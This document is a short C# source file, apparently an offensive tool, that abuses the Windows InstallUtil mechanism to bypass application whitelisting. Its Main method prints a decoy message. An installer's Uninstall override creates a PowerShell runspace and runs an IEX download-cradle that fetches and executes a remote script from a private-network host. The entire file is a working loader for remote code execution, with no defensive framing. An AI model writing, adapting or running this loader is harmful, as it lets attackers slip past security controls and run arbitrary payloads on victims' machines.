using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Runtime.InteropServices;

namespace RFC_InstallUtilPwsh
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("These aren't the droids you're looking for.");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            #region create runspaces
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            PowerShell powershell = PowerShell.Create();
            powershell.Runspace = runspace;
            #endregion

            #region execute payload
            powershell.AddScript("IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.183/payloads/src/RFC-Client.ps1')");
            powershell.Invoke();
            #endregion

            Sleep(10000);
        }
    }
}

